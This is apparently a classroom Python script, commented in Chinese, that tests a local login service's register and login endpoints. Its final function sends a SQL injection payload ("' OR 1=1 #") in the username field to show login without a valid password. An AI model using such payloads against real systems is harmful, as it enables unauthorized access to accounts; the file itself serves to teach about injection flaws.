# 导入requests库：用于发送HTTP请求（教学点：客户端与服务端交互）
import requests

# ===================== 基础配置（教学标注） =====================
# 服务端接口地址（数据类型：字符串，教学点：前后端接口地址）
BASE_URL = "http://127.0.0.1:5000"
# 自定义测试用户（教学点：可随意修改，演示不同用户的注册/登录）
# 数据类型：字典（JSON格式的基础）
TEST_USER = {
    "username": "wyh",        # 测试用户名（字符串）
    "password": "888888"       # 测试明文密码（字符串/数字都可以，服务端会转字符串）
}
# 错误密码（用于演示密码验证失败，教学点：密文验证的准确性）
WRONG_PASSWORD = {
    "username": "lisi",
    "password": "111111"       # 和注册密码不一致
}
INJECT_DATA = {
    "username": "' OR 1=1 #",  # 注入核心：特殊字符改变SQL逻辑
    "password": "123"  # 密码任意，无效密码也能登录
}

# ===================== 1. 注册新用户（教学演示） =====================
def test_register():
    """函数作用：测试注册接口，演示明文密码加密存库"""
    # 拼接注册接口地址（数据类型：字符串）
    register_url = f"{BASE_URL}/register"
    # 发送POST请求（教学点：json参数自动打包成JSON格式）
    # 数据流向：客户端明文密码 → 服务端 → 加密 → 存库
    response = requests.post(register_url, json=TEST_USER, timeout=5)
    # 解析响应结果（数据类型：字典，教学点：JSON解析）
    result = response.json()
    print("="*50)
    print("📌 注册接口测试结果：")
    print(f"请求参数：{TEST_USER}")
    print(f"响应结果：{result}")
    print("="*50)

# ===================== 2. 登录验证（正确密码，教学演示） =====================
def test_login_success():
    """函数作用：测试正确密码登录，演示密文验证通过"""
    login_url = f"{BASE_URL}/login"
    # 发送POST请求（数据流向：明文密码 → 服务端 → 对比密文 → 返回成功）
    response = requests.post(login_url, json=TEST_USER, timeout=5)
    result = response.json()
    print("\n📌 正确密码登录测试结果：")
    print(f"请求参数：{TEST_USER}")
    print(f"响应结果：{result}")
    print("="*50)

# ===================== 3. 登录验证（错误密码，教学演示） =====================
def test_login_fail():
    """函数作用：测试错误密码登录，演示密文验证失败"""
    login_url = f"{BASE_URL}/login"
    # 发送POST请求（数据流向：错误明文 → 服务端 → 对比密文 → 返回失败）
    response = requests.post(login_url, json=WRONG_PASSWORD, timeout=5)
    result = response.json()
    print("\n📌 错误密码登录测试结果：")
    print(f"请求参数：{WRONG_PASSWORD}")
    print(f"响应结果：{result}")
    print("="*50)
#  ===================== 新增：4. SQL注入破解登录（教学核心） =====================
def test_login_inject():
    """函数作用：演示SQL注入漏洞，不用正确密码也能登录（教学核心考点）"""
    login_url = f"{BASE_URL}/login"
    # 发送注入请求（数据流向：注入payload → 服务端拼接错误SQL → 绕过验证）
    response = requests.post(login_url, json=INJECT_DATA, timeout=5)
    result = response.json()
    print("\n📌 SQL注入破解登录测试结果：")
    print(f"注入payload：{INJECT_DATA}")
    print(f"响应结果：{result}")
    print("="*50)
# ===================== 执行测试（教学演示流程） =====================
if __name__ == '__main__':
    # 按顺序执行：注册 → 正确密码登录 → 错误密码登录（教学演示逻辑）
    test_register()
    test_login_success()
    test_login_fail()
    test_login_inject()